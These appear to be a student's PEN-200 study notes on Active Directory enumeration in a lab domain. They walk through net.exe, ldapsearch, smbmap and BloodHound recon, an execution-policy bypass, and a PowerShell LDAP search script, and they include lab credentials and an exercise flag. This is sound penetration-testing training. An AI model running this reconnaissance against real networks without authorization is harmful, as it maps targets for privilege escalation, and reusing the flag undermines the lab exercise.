---
title: "PEN-200 Module 21 \u2014 Active Directory Enumeration Primer"
slug: ad-enum
author: m4xx3d0ut
summary: Active Directory (AD) enumeration underpins every later chapter. These notes
  incorporate the full checklist recorded during the labs.
publishedAt: '2023-11-27'
updatedAt: '2024-01-07'
readingMinutes: 144
tags:
- offsec
---
# PEN-200 Module 21 — Active Directory Enumeration Primer

## TLDR;

Active Directory (AD) enumeration underpins every later chapter. These notes incorporate the full checklist recorded during the labs.

### Baseline Footprinting

```
nltest /dsgetdc:corp.local
nltest /dclist:corp.local
net config workstation
net accounts /domain
Get-ADDomain | Select-Object Name,DomainMode,ForestMode
```

- Document domain functional level, FSMO roles, and trust relationships.
- Capture DNS zone transfers (`dnstool.py`) and GPO links.

### LDAP & SMB Recon

```
ldapsearch -x -H ldap://dc01.corp.local -D 'corp\ldapsvc' -w 'Passw0rd!' -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName userAccountControl
ldapsearch -x -H ldap://dc01.corp.local -b 'DC=corp,DC=local' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName

smbmap -H fileserver.corp.local -u backupuser -p 'Passw0rd!'
net view \\fileserver /all
```

- Track accounts with `adminCount=1`, disabled status, or interesting descriptions.
- Enumerate shares, permissions, and accessible directories.

### Automated Graphing

```
# Collectors
Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -Domain corp.local -ZipFile .\loot\bh.zip
bloodhound-python -c All -u analyst -p 'Passw0rd!' -d corp.local -gc dc01.corp.local
```

- Import into BloodHound, run queries (“Shortest path to Domain Admins”, “Find all Kerberoastable Accounts”).
- Screenshot key graphs for the report and log collection timestamps.

### Credential Hygiene Checks

- `Get-ADUser -Filter {PasswordNeverExpires -eq $true}`.
- `Get-ADFineGrainedPasswordPolicy` to see if weak policies exist.
- Identify unconstrained/ constrained delegation: `Get-ADComputer -Filter {TrustedForDelegation -eq $true}`.
- Note service accounts with weak SPNs and tier-0 group members.

### Reporting Data Points

- Build a table of high-risk findings: missing SMB signing, outdated functional level, excessive Domain Admin membership.
- Provide remediation guidance: enforce LDAP signing, enable Protected Users group, rotate service account passwords to gMSA.

Comprehensive AD enumeration now will save you hours when you start roasting, relaying, and moving laterally in Modules 22–24.

## Working Notes... In Graphic Detail...

### Active Directory Introduction and Enumeration
 
- Introduction to Active Directory.
- Active Directory enumeration using manual tools.
- Enumerating Active Directory using automated tools.

[Active Directory Domain Services](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)

#### 21.1 Active Directory - Introduction

- Introduction to Active Directory.
- Define our enumeration goals.

AD contains critival info about the env, reffered to as objects.
- User info.
- Groups.
- Computers.

Configuring/maintaining an AD instance can be daunting, the wealth of info creates a large attack surface.

The first step in AD config is creating a domain name, `corp.com` for instance, which is often the name of the org itself.  Within the domain, admins can add various objects associated with the org.

*An AD environment has a critical dependency on the Domain Name System (DNS) service. As such, a typical domain controller will also host a DNS server that is authoritative for a given domain.*

To ease object and system management, admins organize the objects into [Organizational Units (OUs)](https://en.wikipedia.org/wiki/Organizational_unit_(computing)).

OUs are like file system folders, they are containers used to store objects within a domain.  Computer objects represent actual servers and workstations that are domain-joined and user objects represent accounts that can be used to log into domain-joined computers.  AD objects contain attributes which will vary depending on the type of object.  A user object may include attributes such as first name, last name, username, phone number, etc.

AD relies on several components and communication services.  When a user logs in, a request is sent to a Domain Controller (DC), that checks if the user is allowed to log in to the domain.  One or more DCs act as the core of the domain and store all OUs, objects, and their attributes.  Since the DC is a central component, we pay close attention to it while we enumerate AD.

Objects can be assigned to AD groups so that admins can manage them as a single unit.  Users in a group can be given access to a file server share or granted admin access to various clients in the domain.  Attackers often target high-priv groups.

Domain Admin members are among the highest priv objects in the domain.  If an attacker compromises a member of this group, often reffered to as "domain administrators", they essentially gain full control over the domain.

This vector could extend beyond a single domain since an AD instance can host more than one domain in a domain tree or multiple domain trees in a domain forest.  There are Domain Admin groups for each domain in the forest, members of the Enterprise Admins group are granted full control over all the domains in the forest and have Admin privs on all DCs, making them a high value target.

We will leverage these and other concepts in this moduleas we focus on the important aspects of AD enumeration.  This important discipline can improve our success during the attack phase.  We will leverage a variety of tools to manually enumerate AD, most rely on the [Lightweight Directory Access Protocol (LDAP)](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol).  Once we've introduced foundational techniques, we'll leverage automation to perform enumeration at scale.

##### Enumeration - Defining our Goals

In this scenario we will enumerate `corp.com` domain.  We've obtained user credentials to a domain user through a successful phishing attack.  Alternatively, the org may have provided us with user creds so that we can perform a pentest base on an assumed breach. This would speed up the process and give the org insight into how easily attackers can move within their enc once they have gained initial access.

the user we have is `stephanie` who has RDP perms on a Win 11 machine that is part of the domain.  the user is not a local admin on the machine, which we take into account as we proceed.

During a real-world, the org may also define the scope and goals of the pentest.  In our case, we are restricted to the `corp.com` domain with the PWK labs.  Our goal will be to enumerate the full domain, including ways to achieve the highest priv possible, domain admin in this case.

In this module, we will perform the enumeration from a client machine with the low priv `stephanie` user.  Once we start performing attacks and we are able to gain access to additional users/systems, we may have to repeat parts of the enumeration process from the new postiion.  Perspective shift, or pivot, is critical during the enum process considering the complexity of permissions across the domain.  Each pivot may give us an opportunity to advance our attack.

For example, if we gain another low priv user account that has the seems to have the same access as `stephanie` we shouldn't dismiss it.  Instead, we should repeat enumeration with the new account since the admins often grant individual users increased perms based on their role in the org.  This "rinse and repeat" process is key to success in enumeration and works extremely well, particularly in large orgs.

#### 21.2 Active Directory - Manual Enumeration
 
- Enumerate Active Directory using legacy Windows applications.
- Use PowerShell and .NET to perform additional AD enumeration.

##### Active Directory - Enumeration Using Legacy Windows Tools

Since we are in an assumed breach scenario and we have creds for `stephanie`, we will use those creds to auth to the domain via Win 11 machine `CLIENT75`.  Use RDP with `xfreerdp` to connect to the client and log in to the domain.
- User `/u`
- Domain `/d`
- Password `LegmanTeamBenzoin!!`
```bash
┌──(operator㉿labhost)-[~/OffSec]
└─$ xfreerdp /u:stephanie /d:corp.com /v:192.168.227.75 
```

AD contains enourmous amounts of information, it can be hard to determine where to start enumerating.  Since every AD install contains users and groups, we start there.

Start gathering user info with [net.exe](https://learn.microsoft.com/en-US/troubleshoot/windows-server/networking/net-commands-on-operating-systems), installed by default on all Win OS systems.  Specifically we will use the `net user` sub-command.  As we know, we can use this tool to enum local accounts onthe machine, we'll use the `/domain` to print out users on the domain.
```powershell
C:\Users\stephanie>net user /domain
The request will be processed at a domain controller for domain corp.com.


User accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
Administrator            dave                     Guest
iis_service              jeff                     jeffadmin
jen                      krbtgt                   pete
stephanie
The command completed successfully.
```
- The output will vary depending on the size of the org.
- We can now query info about individual users.

Admins have a tendancy to add prefix or suffix to usernames that identify accounts by their function.  Based on the output, we should check out the `jeffadmin` user because it may be an admin account.

Inspect with `net.exe` and the `/domain` flag.
```powershell
C:\Users\stephanie>net user jeffadmin /domain
The request will be processed at a domain controller for domain corp.com.

User name                    jeffadmin
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/2/2022 3:26:48 PM
Password expires             Never
Password changeable          9/3/2022 3:26:48 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/27/2023 5:08:57 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```
- `jeffadmin` is a part of the `Domain Admins` group, which we take note of.
 - If we compromise this account we elevate to domain admin.

We can also use `net.exe` to enum groups in the domain with `net group`.
```powershell
C:\Users\stephanie>net group /domain
The request will be processed at a domain controller for domain corp.com.


Group Accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*Debug
*Development Department
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Management Department
*Protected Users
*Read-only Domain Controllers
*Sales Department
*Schema Admins
The command completed successfully.
```
- Some of these are [default](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)
- Others are custom groups created by the admin, which we enum first.
 - Sales Department.
 - Management Department.
 - Development Department.

We use `net` again to enum group members, focusing on Sales Department.
```powershell
C:\Users\stephanie>net group "Sales Department" /domain
The request will be processed at a domain controller for domain corp.com.

Group name     Sales Department
Comment

Members

-------------------------------------------------------------------------------
pete                     stephanie
The command completed successfully.
```
- We find `pete` and `stephanie` are members of the Sales Department group.

In real-world, enum each group and catalog the results.  This requires good organization, which we will discuss later, but we for now we will move on to more flexible alternatives to `net.exe`.

##### Exercises

Start VM Group 2 and log in to CLIENT75 as stephanie. Use net.exe to enumerate the users and groups in the modified corp.com domain to obtain the flag.
```powershell
C:\Users\stephanie>net user /domain
The request will be processed at a domain controller for domain corp.com.


User accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
Administrator            bethany                  christina
dave                     Guest                    iis_service
jeff                     jeffadmin                jen
krbtgt                   pete                     robert
stephanie
The command completed successfully.

C:\Users\stephanie>net user jeffadmin /domain
The request will be processed at a domain controller for domain corp.com.

User name                    jeffadmin
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/2/2022 3:26:48 PM
Password expires             Never
Password changeable          9/3/2022 3:26:48 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/27/2023 5:08:57 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.


C:\Users\stephanie>net user dave /domain
The request will be processed at a domain controller for domain corp.com.

User name                    dave
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/7/2022 8:54:57 AM
Password expires             Never
Password changeable          9/8/2022 8:54:57 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/29/2023 7:28:35 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Development Departmen
The command completed successfully.


C:\Users\stephanie>net user jeff /domain
The request will be processed at a domain controller for domain corp.com.

User name                    jeff
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/2/2022 3:27:20 PM
Password expires             Never
Password changeable          9/3/2022 3:27:20 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/27/2023 2:42:05 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.


C:\Users\stephanie>net user krbtgt /domain
The request will be processed at a domain controller for domain corp.com.

User name                    krbtgt
Full Name
Comment                      Key Distribution Center Service Account
User's comment
Country/region code          000 (System Default)
Account active               No
Account expires              Never

Password last set            9/2/2022 3:10:48 PM
Password expires             10/14/2022 3:10:48 PM
Password changeable          9/3/2022 3:10:48 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Denied RODC Password
Global Group memberships     *Domain Users
The command completed successfully.


C:\Users\stephanie>net user stephanie /domain
The request will be processed at a domain controller for domain corp.com.

User name                    stephanie
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/2/2022 3:23:38 PM
Password expires             Never
Password changeable          9/3/2022 3:23:38 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/29/2023 7:25:05 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Sales Department
The command completed successfully.


C:\Users\stephanie>net user bethany /domain
The request will be processed at a domain controller for domain corp.com.

User name                    bethany
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/29/2023 7:23:42 AM
Password expires             1/10/2024 7:23:42 AM
Password changeable          11/30/2023 7:23:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.


C:\Users\stephanie>net user pete /domain
The request will be processed at a domain controller for domain corp.com.

User name                    pete
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/6/2022 11:41:54 AM
Password expires             Never
Password changeable          9/7/2022 11:41:54 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/1/2023 2:42:42 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Development Departmen
                             *Sales Department
The command completed successfully.


C:\Users\stephanie>net user christina /domain
The request will be processed at a domain controller for domain corp.com.

User name                    christina
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/29/2023 7:23:42 AM
Password expires             1/10/2024 7:23:42 AM
Password changeable          11/30/2023 7:23:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.


C:\Users\stephanie>net user iis_service /domain
The request will be processed at a domain controller for domain corp.com.

User name                    iis_service
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/7/2022 4:38:43 AM
Password expires             Never
Password changeable          9/8/2022 4:38:43 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/1/2023 3:40:02 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.


C:\Users\stephanie>net user jen /domain
The request will be processed at a domain controller for domain corp.com.

User name                    jen
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/6/2022 11:43:01 AM
Password expires             Never
Password changeable          9/7/2022 11:43:01 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/8/2023 11:39:06 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Management Department
The command completed successfully.


C:\Users\stephanie>net user robert /domain
The request will be processed at a domain controller for domain corp.com.

User name                    robert
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/29/2023 7:23:42 AM
Password expires             1/10/2024 7:23:42 AM
Password changeable          11/30/2023 7:23:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.

C:\Users\stephanie>net group /domain
The request will be processed at a domain controller for domain corp.com.


Group Accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
*Billing
*Cloneable Domain Controllers
*Customer support
*Debug
*Development Department
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*IT Service Desk
*Key Admins
*Management Department
*Operators
*OS{5238191c2bb34180ed3cf20295ff4aa2}
*Protected Users
*Read-only Domain Controllers
*Sales Department
*Schema Admins
*Service Personnel
The command completed successfully.


C:\Users\stephanie>net group "Management Department" /domain
The request will be processed at a domain controller for domain corp.com.

Group name     Management Department
Comment

Members

-------------------------------------------------------------------------------
jen
The command completed successfully.


C:\Users\stephanie>net group "Sales Department" /domain
The request will be processed at a domain controller for domain corp.com.

Group name     Sales Department
Comment

Members

-------------------------------------------------------------------------------
pete                     stephanie
The command completed successfully.


C:\Users\stephanie>net group "Development Department" /domain
The request will be processed at a domain controller for domain corp.com.

Group name     Development Department
Comment

Members

-------------------------------------------------------------------------------
dave                     pete
The command completed successfully.

# Flag in domain groups

OS{5238191c2bb34180ed3cf20295ff4aa2}
```


##### Enumerating Active Directory using PowerShell and .NET Classes

We have several tools for AD enum.  PowerShell cmdlets like [Get-ADUser](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) work well but are only installed by default on domain controller as part of the [Remote Server Administration Tools (RSAT)](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools).  RSAT is rarely present on domain clients and we need admin privs to install them.  We can, in principal, impor the DLL required for enum ourselves, but we will look into other options.

We'll develop a tool that requires only basic privs and is flexible enough to use in real-world.  We will mimic the queries AD uses under regular operation.  This will help us understand the basic concepts used in pre-built tools we'll use later.

We'll use PowerShell and .NET classes to create a script that enums the domain.  Although PS development can be complex, we will take it one step at a time.

To enum AD, we first need to understand how to comm with the service.  Before we start writing our script, we will discuss some theory.

AD enum relies on LDAP.  When a domain machine searches for an object, like a printer, or when we query user/group objects, LDAP is used as the comm channel for the query.  In other words, LDAP is the proto used to comm with AD.

*LDAP is not exclusive to AD. Other directory services use it as well.*

LDAP comm with AD is not always straight-forward, but we can leverage [Active Directory Services Interface (ADSI)](https://learn.microsoft.com/en-us/windows/win32/adsi/active-directory-service-interfaces-adsi) as an LDAP provider.

According to MS docs, we need a specific LDAP ADsPath to comm with AD service.  LDAP path prototype looks like:
```
LDAP://HostName[:PortNumber][/DistinguishedName]
```
- We need 3 params for the full LDAP path.
 - HostName.
 - PortNumber.
 - DistinguishedName.

Hostname can be a computer name, IP address, or a domain name.  In our case, we are working with the `corp.com` domain, so we can simply add that to our LDAP path and likely obtain info.  Note that a domain may have multiple DCs, so setting the domain name could resolve to the IP address of any DC in the domain.

While this will return valid info, it may not be the optimal approach.  In fact, to make out enum as accurate as possible, we should look for the DC that holds the most current info.  This is know as the [Primary Domain Controller (PDC)](https://learn.microsoft.com/en-GB/troubleshoot/windows-server/identity/fsmo-roles).  There can only be one PDC in a domain.  To find the PDC, we need to find the DC holding the `PdcRoleOwner` property.  We'll use PowerShell and a specific .NET class to find this.

The PortNumber for LDAP conn is options per MS docs.  In this case, we will not add the port number since it will auto choose the port based on if we are using SSL or not.  It is worth noting that if we come across a domain using non-default ports, we may need to manually add this to the script.

The [DistinguishedName (DN)](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ldap/distinguished-names) is part of the LDAP path.  A DN is a name that uniquely identifies an object in AD, including the domain itself.  If we aren't familiar with LDAP, this may be confusing so let's go into greater detail.

For LDAP to function, objects in AD must be formatted according to a specific naming standard.  To show an example of a DN, we can use our `stephanie` domain user.  We know that `stephanie` is a user object in `corp.com` domain.  The DN may, though we cannot be sure yet, look like this:
```
CN=Stephanie,CN=Users,DC=corp,DC=com
```
- CN (Common Name)
 - Specifies the identifier of an object in the domain.
- DC (Domain Component)
 - In AD terms DC is Domain Controller, but when refereing to a DN, DC means Domain Component.
 - Represents the top of an LDAP tree, in this case it is the DN of the domain itself.

When reading a DN, we start with the DC objects on the right side and move to the left.  In this case, we have 4 components, starting with two components names `DC=corp`, `DC=com`.  The Domain Component objects mentioned above are the top of an LDAP tree following the required naming standard.

The next DN field, `CN=Users` respresents the common name for the container where user object is stored, aka the parent container.

The left most field `CN=Stephanie` represents the common name for the user object itself, which is lowest in the hierarchy.

In the case of the LDAP path we are interested in the Domain Component object, `DC=corp` and `DC=com`.  If we add `CN=Users` to our LDAP path we would be restricted to searching onjects within the given container.

Let's begin writing our script by obtaining the required hostname for the PDC.

In the MS .NET classes relating to AD we will find the `System.DirectoryServices.ActiveDirectory` namespace.  We will focus on the [Domain Class](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.domain?view=windowsdesktop-7.0), but there are several classes to choose from.  It contains a reference to the `PdcRoleOwner` in the properties.  We find a method called `GetCurrentDomain()` which returns the domain object for the current user, `stephanie` in this case.

To invoke `Domain Class` and `GetCurrentDomain()` we run the following command in PowerShell.
```powershell
PS C:\Users\stephanie> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()


Forest                  : corp.com
DomainControllers       : {DC1.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC1.corp.com
RidRoleOwner            : DC1.corp.com
InfrastructureRoleOwner : DC1.corp.com
Name                    : corp.com
```
- From the output we see `PdcRoleOwner` prop is `DC1.corp.com`

We could add the hostname directly into our script as part of the LDAP path, but we want to automate the process so we can also use this script in future engagements.

First we create a var that will store the domain object, then we will print the variable so we can verfiy that it still works in our script.
```
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Print the variable
$domainObj
```

We must bypass execution policy to run our script with `powershell -ep bypass`
```powershell
PS C:\Users\stephanie\Desktop> powershell.exe -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows                                                                                                             PS C:\Users\stephanie\Desktop> .\enum.ps1
Forest                  : corp.com
DomainControllers       : {DC1.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC1.corp.com
RidRoleOwner            : DC1.corp.com
InfrastructureRoleOwner : DC1.corp.com
Name                    : corp.com
```

Our `domainObj` var now holds the info about the domain object, the print statement verifies that our command and var work as expected.

Since the hostname in the `PdcRoleOwner` prop is required for our LDAP path, we can extract the name directly from the domain object.  In case we need more info from the domain object later in our script, we will keep the `$domainObj` for the time being and create a new variable called `$PDC`, which will extract the val from the `PdcRoleOwner` prop held in `$domainObj` var.
```
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Store the PdcRoleOwner name to the $PDC variable
$PDC = $domainObj.PdcRoleOwner.Name

# Print the $PDC variable
$PDC
```

Running the script again.
```powershell
PS C:\Users\stephanie\Desktop> .\enum.ps1
DC1.corp.com
```

In this case we have dynamically extracted the PDC from the `PdcRoleOwner` prop using Domain Class.

We can also get the DN for the domain via the domain object, but it doesn't follow the LDAP naming standard.  We know that the base domain is `corp.com` and the DN would be `DC=corp`,`DC=com`.  We could grap `corp.com` from the Name prop in the domain object and tell PowerShell to break it up and add the `DC=` param.  However there is an easier way which assures we obtain the correct DN.

We can use ADSI directly in PS to retrieve the DN.  Use two single quotes to indicate that the search starts at the top of the AD hierarchy.
```powershell
PS C:\Users\stephanie\Desktop> ([adsi]'').distinguishedName
DC=corp,DC=com
```
- Returns the DN in LDAP path format.

We can add a new var in our script that will store the Dn for the new domain.  
```
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Store the PdcRoleOwner name to the $PDC variable
$PDC = $domainObj.PdcRoleOwner.Name

# Print the $PDC variable
$PDC

# Store the Distinguished Name variable into the $DN variable
$DN = ([adsi]'').distinguishedName

# Print the $DN variable
$DN
```

Run our script.
```powershell
PS C:\Users\stephanie\Desktop> .\enum.ps1
DC1.corp.com
DC=corp,DC=com
```
- We dynamically obtain the Hostname and DN with our script.

Now we must assemble the pieves to build the full LDAP path.  We need to add a new `$LDAP` var that will contain the prior vars prefixed with `LDAP://`.

We can condense the code adding `PdcRoleOwner` to `$PDC` on the first line and remove the comments.
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```

Run our script.
```powershell
PS C:\Users\stephanie\Desktop> .\enum.ps1
LDAP://DC1.corp.com/DC=corp,DC=com
```
- We succesfully used .NET classes and ADSI to dynamically obtain the full LDAP path required for enum.
- This script can be easily resused in real-world.

##### Adding Search Functionality to our Script

Now that our script builds the LDAP path we can build in our search function.

We need two .NET classes located in the `System.DiretoryServices` namespace.
- [DirectoryEntry](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0)
- [DirectorySearcher](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher?view=dotnet-plat-ext-6.0)

`DirectoryEntry` class encapsulates an object in the AD service hierarchy.  In our case we will search from the top of the AD heirarchy by providing the LDAP path to the `DirectoyEntry` class.

*One thing to note with DirectoryEntry is that we can pass it credentials to authenticate to the domain. However, since we are already logged in, there is no need to do that here.*

The `DirectorySearcher` class queries against AD using LDAP, we must specify the AD service to query in the [SearchRoot](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher.searchroot?view=dotnet-plat-ext-6.0) prop.  According to MS docs, this prop indicated where search starts in AD hierarchy.  Since the `DirectoryEntry` class encapsulates the LDAP path pointing to the top of the hierarchy we can pass that as a var to `DirectorySearcher`.

The `DirectorySearcher` docs list `FindAll()` which returns all entries found in AD.

Implement the two classes in our script.
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```
- We added the `$direntry` var.
 - Encapsulates our LDAP path.
- `$dirsearcher` var contains the `$direntry` var and uses the info as `SearchRoot` .
 - Pointing to the top of the hierarchy where `DirectorySearcher` will run the `FindAll()` method.

Since the search starts at the top and we aren't filtering results, it generates a lot fo output.
```powershell
PS C:\Users\stephanie\Desktop> .\enum.ps1

Path
----
LDAP://DC1.corp.com/DC=corp,DC=com
LDAP://DC1.corp.com/CN=Users,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Computers,DC=corp,DC=com
LDAP://DC1.corp.com/OU=Domain Controllers,DC=corp,DC=com
LDAP://DC1.corp.com/CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=LostAndFound,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Infrastructure,DC=corp,DC=com
LDAP://DC1.corp.com/CN=ForeignSecurityPrincipals,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Program Data,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Microsoft,CN=Program Data,DC=corp,DC=com
LDAP://DC1.corp.com/CN=NTDS Quotas,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Managed Service Accounts,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Keys,DC=corp,DC=com
LDAP://DC1.corp.com/CN=WinsockServices,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=RpcServices,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=FileLinks,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=VolumeTable,CN=FileLinks,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Default Domain Policy,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=AppCategories,CN=Default Domain Policy,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Meetings,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Policies,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=User,CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=...
LDAP://DC1.corp.com/CN=Machine,CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,...
LDAP://DC1.corp.com/CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=User,CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=...
LDAP://DC1.corp.com/CN=Machine,CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,...
LDAP://DC1.corp.com/CN=RAS and IAS Servers Access Check,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=File Replication Service,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Dfs-Configuration,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=IP Security,CN=System,DC=corp,DC=com
...
```
- We are receiving objects in the entire domain.
 - This proves the script is working as expected.

There are several simple ways to filter the output.  We ca setup a filter on [samAccountType](https://learn.microsoft.com/en-us/windows/win32/adschema/a-samaccounttype) attribute, which is applied to all user, computer, and group objects.

The official docs reveal different values of the `samAccountType` attribute, but we start with `0x30000000` (decimal 805306368), which will enumerate all users in the domain.  To implement the filter in our script, we can add the filter to the `$dirsearcher.filter` as shown below.
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$dirsearcher.FindAll()
```

Running the script displays all user objects in the domain.
```
Path                                                         Properties
----                                                         ----------
LDAP://DC1.corp.com/CN=Administrator,CN=Users,DC=corp,DC=com {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=Guest,CN=Users,DC=corp,DC=com         {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=krbtgt,CN=Users,DC=corp,DC=com        {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=dave,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcateg...
